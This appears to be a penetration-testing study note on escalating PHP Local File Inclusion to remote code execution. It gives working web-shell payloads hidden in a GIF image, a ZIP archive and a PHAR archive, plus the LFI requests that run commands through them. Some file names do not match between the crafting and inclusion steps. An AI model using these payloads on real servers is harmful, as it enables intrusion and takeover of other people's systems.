---
Primary_category: "[[LFI]]"
title: "LFI TO RCE - FILE UPLOAD"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LFI]]

#### *Image Upload*

Once we have discovered a *Local File Inclusion* vulnerability within a web application, we should review all features that the latter offers, as a user may be able to upload an image or any other file type

Just imagine we sign up on a web application and then we log in. We subsequently access the profiles setting where we can update our avatar

At this point we have a feature that allows us to upload an arbitrary file, namely images, if the upload function is securely coded

So, we can upload an image which contains *PHP* code, if the vulnerable function to *LFI* evaluates the content in addition to including it, such as *include_once()* or *require()*, we can point to that uploaded file and the *PHP* code will be evaluated

##### *Crafting a malicious Image*

To prevent any error when uploading an image, we must ensure that the file extension corresponds to an allowed extension by the upload form and also include the image magic bytes at the beginning of the file content *( e.g. GIF8 → .GIF )*

```bash
echo 'GIF8<?php system($_GET[0]); ?>' > shell.gif
```

##### *RCE*

After upload the image, we must discover the location where it has been stored

To do so, if the given image is displayed on the web application, we can access the *elements* section within the *Dev Tools* to search for its *URL*

If not, we can perform *[[FUZZING|Fuzzing]]* to look for any existing uploads directory

Once we know the storage web path, all we need is to include it through the *LFI* vulnerability

```bash
?language=./profile_images/shell.gif&0=whoami
```

---

#### *ZIP Upload*

Similarly, we can use the *zip://* wrapper in order to point to a *PHP* script stored within a *ZIP* file. If the function vulnerable to *LFI* evaluate the content of the given file, we will get *RCE*

The caveat of this approach is that the *ZIP* extension must be enabled, which is not the default

If so, we can proceed as follows

##### *Crafting a malicious ZIP file*

Imagine we have another upload form which only allows *image-related* extensions, such as *.jgp, .png* and so on

We can create a *ZIP* file containing a *PHP* script and call the former *shell.jpg*. Doing so, we may bypass the mentioned restriction if the web application does not test the content-type of the uploaded file

```bash
echo -n '<?php system($_GET[0]); ?>' > shell.php && zip shell.jpg shell.php
```

##### *RCE*

Once we upload the *ZIP* file and we know the web path where it is stored, we can point to the *PHP* script within it through the *LFI* using the *zip://* wrapper

> ***zip://<ZIP_FILE>#<PHP_FILE>***

```bash
?language=zip://./profile_images/shell.zip%23shell.php&0=whoami
```

---

#### *PHAR Upload*

As with the *zip://* wrapper, the *phar://* wrapper allows to access files stored within a *PHAR* file without having to decompress it

Therefore, if the *ZIP* extension is not enabled, we could craft a malicious *PHAR* file which contains a *PHP* web shell, then point to the latter through the *LFI* and gain *RCE*

##### *Crafting a malicious PHAR file*

```bash title=shell.php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET[0]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

##### *RCE*

With the *PHAR* file uploaded, as mentioned, we can point to the *PHP* script stored within it

```bash
?language=phar://shell.phar/shell.txt&0=whoami
```